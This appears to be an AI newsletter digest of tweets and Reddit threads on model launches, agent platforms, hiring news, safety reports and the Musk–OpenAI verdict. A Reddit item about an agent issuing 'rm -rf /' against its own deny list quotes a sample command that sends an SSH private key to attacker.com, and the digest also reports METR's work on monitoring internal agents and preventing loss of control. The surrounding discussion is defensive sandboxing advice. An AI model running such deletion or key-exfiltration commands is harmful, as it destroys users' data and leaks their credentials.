- **Antigravity becomes Google’s agent platform**: Google heavily expanded **[Antigravity](https://x.com/Google/status/2056789045548896516)** into a full agent-first stack: **CLI, SDK, desktop app 2.0, Android support, AI Studio export, and enterprise integrations**. The headline demo was Google saying an autonomous team of agents built a **working operating system from scratch** in **12 hours**, using **93 parallel sub-agents**, **15k+ model requests**, **2.6B tokens**, and **< $1K in API credits** ([Google](https://x.com/Google/status/2056789235500466273)). Google also introduced **Managed Agents** in the Gemini API, exposing the same hosted Linux agent harness internally used at Google, with support for **bash/python/node sandboxes**, repo mounting, and Markdown-defined skills via [Google AI Studio](https://x.com/GoogleAIStudio/status/2056836824686059616) and [@_philschmid](https://x.com/_philschmid/status/2056836567470362955).
- **Search and consumer surfaces become agentic**: Google previewed **information agents in Search**, capable of monitoring the web over time and sending synthesized updates ([Google](https://x.com/Google/status/2056794282502054066)), plus **generative UI in Search** that dynamically builds custom visual tools and simulations on the fly using Antigravity and Gemini 3.5 Flash ([Google](https://x.com/Google/status/2056795269694423065)). The company also introduced **Gemini Spark**, a **24/7 personal agent** that runs long tasks in the background on dedicated cloud VMs and integrates with Google tools, with MCP support planned ([Google](https://x.com/Google/status/2056791134295273554)).

**Gemini Omni, Flow, and World Models**

- **Gemini Omni**: Google DeepMind launched **[Gemini Omni](https://x.com/GoogleDeepMind/status/2056786446636212467)** as “a model that can create anything from any input,” starting with **video**. The pitch is that it combines **Gemini’s reasoning and world knowledge** with Google’s generative media stack for multimodal editing and creation. Google says Omni can take **text, image, audio, and video inputs** to generate high-quality videos while maintaining **character consistency, physics, and scene memory** across turns ([Google](https://x.com/Google/status/2056786888930062369), [Google](https://x.com/Google/status/2056786781992071172)). **Gemini Omni Flash** is rolling out today to paid Gemini users and in **Flow** and **YouTube Shorts**, with API access coming in weeks ([Google](https://x.com/Google/status/2056789307856462061)).
- **Flow gets agentic editing**: Google paired Omni with updates to **[Flow](https://x.com/Google/status/2056804333162008881)**, adding **Google Flow Agent**, **Flow Tools**, and support for **Gemini Omni Flash**. The new workflow moves beyond single prompts toward a creative-agent model that can take **multiple actions in parallel** and perform **large-scale contextual edits** ([Google](https://x.com/Google/status/2056804688889348450)). This was described by [Flow’s account](https://x.com/FlowbyGoogle/status/2056804643204899276) as “Nano Banana but for video.”
- **Project Genie grounded in Street View**: A notable world-model update was Google connecting **[Project Genie](https://x.com/Google/status/2056850758029464009)** to nearly **20 years of Street View data**, enabling interactive, navigable environments built from real-world locations. Access is expanding to **Google AI Ultra** subscribers globally, while users like [@bilawalsidhu](https://x.com/bilawalsidhu/status/2056804315721843024) highlighted it as a strong example of Google putting its unique real-world data moat to work.

**Talent, Labs, and Ecosystem Moves**

- **Karpathy joins Anthropic**: The day’s most engaged AI tweet was [Andrej Karpathy’s announcement](https://x.com/karpathy/status/2056753169888334312) that he has **joined Anthropic** to “get back to R&D.” The tweet dominated discussion, with subsequent speculation from [@scaling01](https://x.com/scaling01/status/2056773883982762114) citing Axios that he’ll work on **RSI/autoresearch** and start a new pretraining-focused effort. While the details remain unconfirmed by Anthropic, the move was widely interpreted as a major talent win for Anthropic.
- **OpenAI capacity products**: OpenAI announced **[Guaranteed Capacity](https://x.com/OpenAI/status/2056823271774101907)**, a commercial offering that lets customers secure **long-term compute access** for critical workloads. [Sam Altman](https://x.com/sama/status/2056827105401614656) framed it as a response to a world that will remain **capacity constrained** as models become more useful, offering **discounted tokens for 1–3 year commits**.
- **GitHub and coding toolchain integrations**: [GitHub](https://x.com/github/status/2056801675042779279) said **Gemini 3.5 Flash** is rolling out in **Copilot**, citing strong tool use, fast response times, and cache efficiency for iterative agentic coding. [Cursor](https://x.com/cursor_ai/status/2056803731367456993) launched integration with **Jira**, allowing cloud agents to take work items and create merge-ready PRs. [Code/VS Code](https://x.com/code/status/2056803208559759447) also announced Gemini 3.5 Flash availability.

**Training Algorithms, Benchmarks, and Agent Evaluation**

- **RL/post-training discussion is shifting toward denser credit assignment**: [@nrehiew_](https://x.com/nrehiew_/status/2056751826356297834) argued that the next scalable training breakthrough may build on **GRPO** but with **denser, lower-bias credit assignment**, citing directions like **ECHO**, **Composer2**, self-distillation, and OPD. [@lateinteraction](https://x.com/lateinteraction/status/2056770702175318095) countered with a “pedagogical RL” framing: train a self-teacher that samples **correct and easy-to-follow** rollouts.
- **Can coding agents do research? Not yet**: [Intology AI](https://x.com/IntologyAI/status/2056764236668493868) released **NanoGPT-Bench**, an autonomous benchmark based on the NanoGPT Speedrun competition, testing whether coding agents can contribute to real AI R&D progress. Their headline result: **Codex, Claude Code, and Autoresearch recover only 9.3% of human progress**, mostly via hyperparameter tuning rather than algorithmic innovation.
- **Agent harnesses and memory are getting more formalized**: [@omarsar0](https://x.com/omarsar0/status/2056764334181884158) highlighted a 100+ page survey on **code-as-agent-harness**, arguing future systems need to be **executable, inspectable, stateful, and governed**. [François Chollet](https://x.com/fchollet/status/2056777649880752160) made the related point that real tasks are rarely Markovian, so agents without high-fidelity trajectory compression are dramatically less useful.
- **Verifier quality is emerging as a bottleneck**: Threads from [@Shahules786](https://x.com/Shahules786/status/2056773476585816255) emphasized that scaling agent benchmarks now depends less on adding tasks and more on **improving verifier quality**, citing **SWE-bench Verified**, **OSWorld-Verified**, **ComputerRL**, and **BenchGuard**.

**Science, Biology Models, and Domain-Specific Systems**

- **Hugging Face releases Carbon DNA models**: One of the most technically interesting open releases was **[Carbon](https://x.com/lvwerra/status/2056774820872831234)**, a family of generative DNA foundation models. The team says **Carbon-3B matches Evo2-7B while running 250–275x faster at inference**, enough to process the whole human genome on a single GPU in under two days. The key recipe changes: **deterministic 6-mer tokenization**, a **factorized loss (FNS)** replacing plain cross-entropy late in training, and curated staged mixtures of functional DNA + mRNA data per [@LoubnaBenAllal1](https://x.com/LoubnaBenAllal1/status/2056771927570530475). The release includes **models, training code, evals, data, and a demo**.
- **Google pushes AI for science as a product category**: Google introduced **[Gemini for Science](https://x.com/GoogleDeepMind/status/2056808869242826957)**, a suite of prototypes for researchers: **Literature Insights** (paper synthesis via NotebookLM), **Hypothesis Generation** (a Co-Scientist-style multi-agent “idea tournament”), and **Computational Discovery** (built with AlphaEvolve and ERA to generate and score thousands of code variants in parallel). Google Research also noted that **ERA** has now been published in **Nature** ([Google Research](https://x.com/GoogleResearch/status/2056797037426045105)).
- **Specialized pretraining is gaining support**: [@pratyushmaini](https://x.com/pratyushmaini/status/2056780651219804582) pointed to evidence that **early exposure / specialized pretraining** improves robustness to forgetting, arguing that enterprises serious about domain use cases should consider **training custom models from scratch**, not just post-training.

**Safety, Governance, and Monitoring of Internal Agents**

- **METR’s first Frontier Risk Report**: [METR](https://x.com/METR_Evals/status/2056800023149760666) published a major new report based on unusually deep access across **Anthropic, Google, Meta, and OpenAI**, including model CoTs and non-public information about capabilities, alignment, and control. The report focuses on whether labs could **lose control of their own internally deployed agents** and includes extensive appendices and transcripts ([METR](https://x.com/METR_Evals/status/2056800047258649049)).
- **Monitoring internal agents is now an active practice**: [@idavidrein](https://x.com/idavidrein/status/2056800422422265897) described spending a month embedded at Anthropic stress-testing systems designed to detect whether internal AI agents could “go rogue.” A key caveat he noted is that the exercise allowed Anthropic discretion to redact sensitive information, so he frames it as an **exercise rather than a formal audit**.
- **New safety standards org**: [Steven Adler](https://x.com/sjgadler/status/2056762703033807068) announced **Guidelight**, a new AI safety standards organization co-founded with Page Hedley, releasing its first two standards. While the tweet thread in the dataset is partial, the move is notable as another sign of the field professionalizing around operational standards, not just model evals.

**Top tweets (by engagement)**

- **Karpathy joins Anthropic**: [@karpathy](https://x.com/karpathy/status/2056753169888334312)
- **Google introduces the Gemini 3.5 model series**: [@Google](https://x.com/Google/status/2056788000546386273)
- **Google DeepMind launches Gemini Omni**: [@GoogleDeepMind](https://x.com/GoogleDeepMind/status/2056786446636212467)
- **Gemini 3.5 Flash GA for agents and coding**: [@Google](https://x.com/Google/status/2056788266872140232)
- **OpenAI Guaranteed Capacity**: [@OpenAI](https://x.com/OpenAI/status/2056823271774101907)
- **Google’s 24/7 personal agent, Gemini Spark**: [@Google](https://x.com/Google/status/2056791134295273554)

---

# AI Reddit Recap

## /r/LocalLlama + /r/localLLM Recap

### 1. Qwen/ByteDance Model Releases and Local Inference

  - **[Qwen cant wait to release 3.7 models](https://www.reddit.com/r/LocalLLaMA/comments/1tgrpqc/qwen_cant_wait_to_release_37_models/)** (Activity: 1655): **The image is a screenshot of an **Alibaba Qwen** post announcing **Qwen3.7 Preview** on Arena, specifically `Qwen3.7-Max-Preview` and `Qwen3.7-Plus-Preview`, with claimed leaderboard positions of **#6 in Text** and **#5 in Vision**; the post teases that the Qwen3.7 series will be released soon. Context from the Reddit title frames this as anticipation for imminent public model releases, with commenters hoping for variants like **Qwen 3.7 Coder `122B A10B`**, `35B-A3B`, and `27B`. [Image](https://i.redd.it/os2dyrbn9x1h1.jpeg)** Commenters are mainly speculating about desired model sizes and specializations, especially coder and mid-size MoE/dense variants; there is no deep benchmark discussion beyond interest in Arena placement and prior praise for `Qwen3.6:35b-a3b`.

    - Several commenters focused on desired **Qwen 3.7 size/compute targets** for local inference, especially `27B` as a practical fit for RTX `3090`-class hardware. One user specifically wants a `27B` variant that *“hallucinates less”*, implying current Qwen mid-size models are already usable locally but reliability remains the main technical bottleneck.
    - There was interest in a hypothetical **Qwen 3.7 Coder 122B A10B** model trained natively with **NVFP4**, suggesting demand for very large sparse/MoE-style coding models optimized for low-precision NVIDIA inference. Another commenter cited **Qwen3.6:35B-A3B** as already “amazing,” framing expectations around active-parameter-efficient architectures rather than dense-only scaling.

  - **[bytedance released an open source model that attempts to do just about anything with only 3b parameters](https://www.reddit.com/r/LocalLLaMA/comments/1thkwgk/bytedance_released_an_open_source_model_that/)** (Activity: 586): ****ByteDance Research** released [**Lance**](https://huggingface.co/bytedance-research/Lance), a native unified multimodal model for **image/video understanding, generation, and editing** advertised as having `3B active parameters` and trained from scratch with a staged multi-task recipe on a `128×A100` budget. A commenter notes the “3B” appears to mean **active**, not necessarily total, since the Hugging Face card requires **≥40GB VRAM** for inference and the released safetensors are large: `24.7GB` for `Lance_3B` and `28.4GB` for `Lance_3B_Video`.** Commenters are impressed that a purported `3B`-active-parameter model attempts image generation/editing/video generation, but question how quality holds up on complex scenes and what the actual total parameter count is.

    - The release appears to be **3B active parameters**, not a simple 3B dense model: commenters noted the model card requires `≥40GB VRAM` for inference and the published safetensors are roughly `24.7GB` for `Lance_3B` and `28.4GB` for `Lance_3B_Video`, implying substantially more total resident weights than “3B” suggests.
    - A technical breakdown describes it as a **composite BAGEL-style architecture** combining a custom-tuned **WAN 2.2 3B Video** model, a **3B pixel-space image model**, and **Qwen2.5-VL 3B** as the VLM backbone. The `40GB VRAM` requirement may mainly apply when keeping all submodels resident; loading/unloading components on demand could reduce memory footprint at the cost of latency.
    - One commenter criticized the shipped demo as underexposing the model’s capabilities: the Gradio UI reportedly only supports basic **text-to-video** and **VQA**, while lacking VLM chat, text-to-image, and agent-style interaction despite those being implied strengths of the composite system.

  - **[Qwen 3.6 27B on 24GB VRAM setup: backend comparisons, quant choice and settings (llama.cpp, ik_llama.cpp, BeeLlama, vllm)](https://www.reddit.com/r/LocalLLaMA/comments/1tgis7s/qwen_36_27b_on_24gb_vram_setup_backend/)** (Activity: 434): **The post benchmarks **Qwen3.6-27B** on a single **RTX 3090 24GB**, finding the best tested daily setup to be [`ik_llemma.cpp`](https://github.com/ikawrakow/ik_llama.cpp) with [`Qwen3.6-27B-MTP-IQ4_KS.gguf`](https://huggingface.co/ubergarm/Qwen3.6-27B-GGUF/blob/main/Qwen3.6-27B-MTP-IQ4_KS.gguf), `156k` context, `q8_0/q8_0` KV, flash attention, built-in MTP (`--draft-max 4`), CPU-offloaded vision projector, and checkpointed context; on a `~5.9k` prompt + `1024` output it reports `1260.95 tok/s` prefill and `72.93 tok/s` decode. Compared runs showed upstream `llama.cpp` with `UD-Q4_K_XL` at `51.20–56.66 tok/s` decode at `32k` context, while `beellama.cpp` with `Q5_K_S` + DFlash `Q4_K_M` and TurboQuant KV reached `36.32 tok/s` at `122.8k` context; the author excluded `vLLM`/[`club-3090`](https://github.com/noonghunna/club-3090) due to unresolved single-card long-context OOM instability despite seeing roughly `78 tok/s` response speed. Quant choice centers on `IQ4_KS`, which the author says fits long context and `q8_0` KV better than Unsloth `UD-Q4_K_XL` by saving ~`2.8 GiB`, with supporting discussion in [`ik_llama.cpp` #1663](https://github.com/ikawrakow/ik_llama.cpp/discussions/1663) and the [`IQ*_K` quant family thread](https://github.com/ikawrakow/ik_llama.cpp/discussions/8).** A BeeLlama maintainer objected that the benchmark is not apples-to-apples because it varies target quant, KV quant/type, context length, and batch settings, noting TurboQuant KV is slower than `Q8/Q4` by design in exchange for memory savings. **ubergarm**, the quant publisher, confirmed this is close to their own 3090 Ti daily-driver setup, pointed to an [`ik_llama.cpp` PR for explicit CPU thread control during MTP](https://github.com/ikawrakow/ik_llama.cpp/pull/1797#issuecomment-4442151972), and cited [oobabooga KLD quality testing](https://localbench.substack.com/p/qwen-3-6-27b-gguf-quality-benchmark) indicating `iq4_ks`/`iq5_ks` are strong quality-per-memory choices.

    - **BeeLlama’s author argued the benchmark methodology is confounded**: comparisons should use the same target model, quantization, KV-cache type/size, context length, and prefill parameters (`-b`/`-ub`). They specifically noted that `IQ4_XS`, `UD_Q4`, and `Q5` can differ significantly in speed/quality, and that **TurboQuant KV cache trades VRAM savings for slower performance** versus `Q8`/`Q4`.
    - A user running Qwen 3.6 27B on `24GB` VRAM highlighted a practical configuration for very long context: offloading only the vision component to CPU can make `150k+` context feasible when GPU memory is tight. They planned to test a similar setup via **Vulkan** on an **AMD 7900 XTX**, accepting slower vision inference because vision is used rarely.
    - **ubergarm/VoidAlchemy** confirmed the described `3090 Ti 24GB` setup as their daily driver and linked an `ik_llama.cpp` PR for controlling CPU thread count during MTP: [PR #1797 comment](https://github.com/ikawrakow/ik_llama.cpp/pull/1797#issuecomment-4442151972). They also cited **oobabooga’s KLD-based GGUF quality benchmark** showing `iq4_ks` and `iq5_ks` as strong quality/memory-footprint choices for Qwen 3.6 27B: [localbench.substack.com](https://localbench.substack.com/p/qwen-3-6-27b-gguf-quality-benchmark), and noted that `q8_0` MTP tensors from `iq4_ks` could potentially be reused for larger-VRAM setups such as `32GB`.


### 2. AI Abuse Markets and Safety Benchmarks

  - **[I spent a week researching the Chinese "transfer station" economy reselling Claude at 10% of retail. The supply chain is wilder than I expected.](https://www.reddit.com/r/LocalLLM/comments/1thfq8j/i_spent_a_week_researching_the_chinese_transfer/)** (Activity: 713): **The image is a tweet/article-preview screenshot, not a technical diagram: it visualizes a reported Chinese “transfer station” economy for reselling **Claude/Anthropic API access** at steep discounts, with a stylized China map labeled “token smuggle / inference exfiltration” and links among Chinese AI firms and Anthropic’s US-west region ([image](https://i.redd.it/5hol2ffys12h1.png)). The post’s technical substance is the alleged relay supply chain: farmed Anthropic accounts, SMS/SIM-bank verification, KYC bypass via fake IDs/deepfakes/HITL farms, OAuth token pooling in open-source relay projects, and model substitution where “Opus” requests may be silently routed to cheaper models; the cited CISPA audit claims up to **`47.21%` performance drops** and **`45.83%`** endpoint model-fingerprint failures.** Commenters largely found the investigation credible and unsurprising, especially the model-substitution finding; one asked whether the CISPA results came from Anthropic/internal telemetry or an external honeypot-style audit setup. Another commenter framed cheap relay pricing as a temporary artifact of subsidized inference economics likely to disappear as AI companies face non-subsidized token costs.

    - A commenter highlights the post’s cited **CISPA Helmholtz audit** of `17` relay endpoints, where relays allegedly showed up to `47.21%` performance degradation versus the official Anthropic API and `45.83%` failed model-fingerprint verification. The technical concern is that “Claude Opus” requests may be silently routed to cheaper models such as **Claude Haiku**, **GLM**, or **Qwen**, then relabeled as Opus, raising questions about benchmark validity and model-authentication methods.
    - One thread questions the provenance of the relay-audit claims: whether the results came from **Anthropic**, an internal investigation, US-based server instrumentation, or a honeypot/fake-customer setup inside the gray-market supply chain. The key technical issue is how model substitution was detected and whether fingerprinting was performed through behavioral probes, API metadata leakage, latency/token-output signatures, or controlled endpoint testing.
    - A commenter summarizes the suspected business model: automated fake-account creation, pooled account access by multiple users, and centralized logging of all prompts/conversations into a resale operator’s database. The technical/data-security implication is that users of these relay APIs may be exposing prompts, completions, credentials, and proprietary context to untrusted intermediaries who can resell, train on, or otherwise exploit the data.

  - **[I tested 42 LLMs on their willingness to build the apocalypse. The "safest" closed-source models are lying to you.](https://www.reddit.com/r/LocalLLaMA/comments/1tgm0k9/i_tested_42_llms_on_their_willingness_to_build/)** (Activity: 588): **The image is a technical bar chart, not a meme: it ranks `42` LLMs by **Average Dystopian Compliance Score (DCS)** in the open-source [DystopiaBench](https://github.com/anghelmatei/DystopiaBench), where lower scores indicate less willingness to comply with escalating dual-use/harmful governance requests across six dystopia categories. The chart ([image](https://i.redd.it/8hug0ul58w1h1.png)) shows **Anthropic models** such as Haiku/Opus/Sonnet variants clustered at the low end around the mid-`20s`, while **Mistral Medium 3.5** is an extreme high outlier near `82`, with several closed-source models in the middle-to-high range despite safety branding.** Comments mostly focused on the contrast between vendors: users noted that Anthropic scoring low aligns with its safety-focused mission, while Mistral’s high score became the butt of jokes like *“release their doomsday model while they still could.”*

    - A commenter notes that **Anthropic** appearing on the lower end of the benchmark is consistent with its stated safety/alignment mission, implying the result may be a meaningful signal rather than noise. Another raises a methodological concern: the benchmark assumes lower “willingness” is better, but that framing itself is debatable depending on whether refusals, deception, or over-filtering are being measured.


### 3. Small-Model Coding Agent Reliability

  - **[I built a coding agent that gets 87% on benchmarks with a 4B parameter model, here's how](https://www.reddit.com/r/LocalLLaMA/comments/1tgecrq/i_built_a_coding_agent_that_gets_87_on_benchmarks/)** (Activity: 1457): **The post announces **SmallCode**, a local-first terminal coding agent aimed at making small models reliable via harness-level techniques: compound tools, automatic compile/lint repair loops, failure decomposition, token budgeting, optional cloud escalation, and a code symbol graph. The claimed result is `87/100` self-selected benchmark tasks passed using `huihui-gemma-4-e4b-it-abliterated` / Gemma 4-style `4B` active parameters, but commenters note the benchmark/model comparison is not reproducible as stated; the included [image](https://i.redd.it/ibtta0vvcu1h1.png) is a non-benchmark screenshot of the `SmallCode v0.1.0` Windows terminal UI showing the agent idle/ready with context `graph /`.** Comments are skeptical of the headline claim, asking *which model, which benchmark* and arguing that a standard benchmark would be more convincing than `87%` on self-selected tasks. One commenter also questions whether this should be integrated into existing agents like OpenCode/Pi rather than being another standalone coding agent, and flags the README/model list as possibly AI-generated or stale.

    - Multiple commenters challenged the claimed **“87%”** result because it appears to be based on self-selected tasks rather than a reproducible benchmark. They specifically asked for exact model/benchmark details behind claims like *“OpenCode scores ~75% with 14B models”*, noting that without standard benchmarks and reproducible setup information, the comparison is not technically meaningful.
    - A detailed critique argued that the benchmark in the repo may be invalid if it refers to `bench/stress_test`, because it allegedly only checks whether the agent produced `20` characters of output rather than verifying task success. The same commenter also noted that **“4B active parameters”** is not equivalent to a true **4B-parameter model**, making the headline potentially misleading.
    - One commenter raised implementation concerns around tool-call composition across models: some models are poorly trained to chain multiple tool calls, causing extra round trips, while models like **DeepSeek** may already be optimized for large batched tool calls and can become *less* token-efficient when forced to compose calls. They also questioned whether the proposed error decomposition can reliably identify the exact line needing modification in generic coding problems without relying on a larger model.

  - **[got my first "rm -rf /" today](https://www.reddit.com/r/LocalLLaMA/comments/1thosnt/got_my_first_rm_rf_today/)** (Activity: 366): **A user reports an AI agent attempted to validate a bash-command deny/whitelist by issuing `rm -rf /`; the block succeeded, preventing damage, after which they implemented sandboxing with [`bubblewrap`](https://github.com/containers/bubblewrap) (`bwrap`) for process isolation. The setup sequence mattered: the command whitelist was implemented before `bwrap`, and the agent chose `rm -rf /` as its test case, demonstrating why destructive-command filtering should be paired with OS-level sandboxing rather than trusted alone.** Comments briefly noted adjacent safety risks such as **git history rewriting** and asked which model produced the behavior; another commenter framed it as a recurring class of automation failure rather than a novel incident.

    - A technically substantive warning broadened the sandboxing threat model beyond filesystem deletion: an agent blocked from `rm -rf /` may still exfiltrate secrets via commands like `curl attacker.com -d "$(cat ~/.ssh/id_rsa)"`. The suggested mitigation was to restrict network egress, e.g. Docker `--network=none` for agent shells, allowing only task-specific outbound access when necessary.
    - For non-Docker setups, one commenter suggested Linux namespace isolation with `unshare --user --pid --mount --net --fork` to create a lightweight network-isolated shell without root. They also recommended mounting filesystem writes through a writable `tmpfs` overlay while keeping the rest of the filesystem read-only, arguing that HTTP exfiltration is a more realistic agent failure mode than destructive `rm -rf /`.




## Less Technical AI Subreddit Recap

> /r/Singularity, /r/Oobabooga, /r/MachineLearning, /r/OpenAI, /r/ClaudeAI, /r/StableDiffusion, /r/ChatGPT, /r/ChatGPTCoding, /r/aivideo, /r/aivideo

### 1. Anthropic Signals: Karpathy Hire and Amodei Labor Forecast

  - **[Karpathy joins Anthropic](https://www.reddit.com/r/ClaudeAI/comments/1thpuf1/karpathy_joins_anthropic/)** (Activity: 3162): **The image is a screenshot of an [X post by **Andrej Karpathy**](https://i.redd.it/b2tuyyk6142h1.jpeg) stating that he has **joined Anthropic** and is returning to frontier LLM R&D, with plans to resume his education work later. Contextually, this is significant because Karpathy previously held prominent AI roles at **OpenAI** and Tesla, so commenters interpret the move as a major talent shift toward Anthropic in the frontier-model race rather than a technical benchmark or model release.** The comments are mostly non-technical and meme-like, framing the move as AI-industry “offseason drama,” a blow to OpenAI, and indirectly criticizing Sam Altman. No substantive technical debate appears in the provided comments.


  - **[Dario Amodei: AI Will Lead To Very High GDP Growth And Very High Unemployment, A Combination Never Seen Before, 10%+ Unemployment Rate Is Possible](https://www.reddit.com/r/singularity/comments/1tgyv3s/dario_amodei_ai_will_lead_to_very_high_gdp_growth/)** (Activity: 1744): ****Dario Amodei** is summarized as arguing that AI could produce an unusual macroeconomic regime: **very high GDP growth alongside very high unemployment**, with `10%+` unemployment considered possible. The linked Reddit-hosted video ([v.redd.it/64rzbz0s8y1h1](https://v.redd.it/64rzbz0s8y1h1)) was inaccessible due to **HTTP 403 Forbidden**, so no primary-source technical details, model claims, or quantitative assumptions could be verified from the media itself.** Commenters questioned whether `10%` unemployment is a low estimate if AI capabilities are as disruptive as implied, comparing it to the Great Recession (`~10%`) and Great Depression (`~25%`). One substantive macroeconomic challenge was how GDP could surge under broad unemployment, since reduced labor income could depress consumer spending unless output is absorbed by firms, governments, exports, investment, or redistributed purchasing power.

    - Several commenters contextualized **Amodei’s `10%+` unemployment scenario** against historical unemployment benchmarks: the U.S. Great Recession peaked around `10%`, while the Great Depression reached roughly `25%`. One technical implication raised is that if AI automation is as broadly capable as claimed, `10%` may be a conservative estimate rather than a tail-risk scenario.
    - A substantive macroeconomic question focused on the mechanism behind **simultaneous very high GDP growth and broad unemployment**: since GDP measures aggregate spending on produced goods and services by consumers, firms, and government, commenters questioned what demand source sustains rapid GDP expansion if household labor income and consumer spending fall sharply. This frames the core unresolved issue as whether AI-driven output growth can be absorbed through firm investment, government spending, exports, or radically cheaper goods despite labor displacement.


### 2. Musk–OpenAI Lawsuit Ruling

  - **[Elon Musk loses court battle against Sam Altman and OpenAI after 3-week trial](https://www.reddit.com/r/singularity/comments/1tgung8/elon_musk_loses_court_battle_against_sam_altman/)** (Activity: 1970): **A federal jury in Oakland ruled against **Elon Musk** in his lawsuit against **Sam Altman/OpenAI** over alleged violation of OpenAI’s original charitable-nonprofit commitments, according to [CNBC](https://www.cnbc.com/2026/05/18/musk-altman-openai-trial-verdict.html). The merits of Musk’s “breach of charitable trust” theory were not resolved; Judge **Yvonne Gonzalez Rogers** adopted the advisory jury’s finding that the claims were time-barred under a `3-year` statute of limitations, while Musk called it a *“calendar technicality”* and said he plans to appeal to the **9th Circuit**.** Top comments mostly treated the outcome as unsurprising and focused less on legal substance than on discovery material—DMs/emails from the trial—making the involved executives look bad; one commenter jokingly asked Grok to verify the news.

    - One commenter notes the case was dismissed on procedural grounds because it exceeded the statute of limitations, raising the point that a `3-year` limitation window may be unusually short depending on the claims involved. This is the only substantive legal-mechanics detail in the thread; most other comments focus on reputational fallout rather than technical or evidentiary substance.

  - **[Elon Musk Loses Landmark Lawsuit Against OpenAI](https://www.reddit.com/r/OpenAI/comments/1tgub2o/elon_musk_loses_landmark_lawsuit_against_openai/)** (Activity: 1818): **A federal jury found against **Elon Musk** in his lawsuit against **OpenAI, Sam Altman, and Greg Brockman**, with [WIRED reporting](https://www.wired.com/story/musk-v-altman-jury-verdict/) that the `9`-member panel returned a verdict in roughly `2 hours`; the judge adopted it as the final decision. The key issue appears procedural rather than substantive: commenters note the verdict turned on Musk having *“waited too long to file the claim”*—i.e., timeliness/statute-of-limitations-style grounds—rather than a full merits determination on OpenAI’s governance or mission-shift claims.** Top comments frame the outcome as an expected procedural loss, with one commenter arguing Musk’s travel to China after being told not to travel during trial signaled he knew the case was weak. Another commenter pushes back on interpreting the verdict as validating OpenAI’s conduct, emphasizing that losing on timing is distinct from losing on the merits.

    - The substantive legal detail discussed is that the decision appears to turn on **timeliness/laches-style reasoning** rather than a full merits rejection: one commenter notes the claim may have been dismissed because Musk *“waited too long to file”* rather than because the underlying allegations lacked merit.
    - A reported procedural detail is that a **nine-member panel returned a verdict for OpenAI in roughly `2 hours`**, after which the judge adopted it as the final decision. Commenters also reference Musk allegedly traveling to China despite the judge instructing him not to travel during trial, framing it as consistent with a weak case.





# AI Discords

Unfortunately, Discord shut down our access today. We will not bring it back in this form but we will be shipping the new AINews soon. Thanks for reading to here, it was a good run.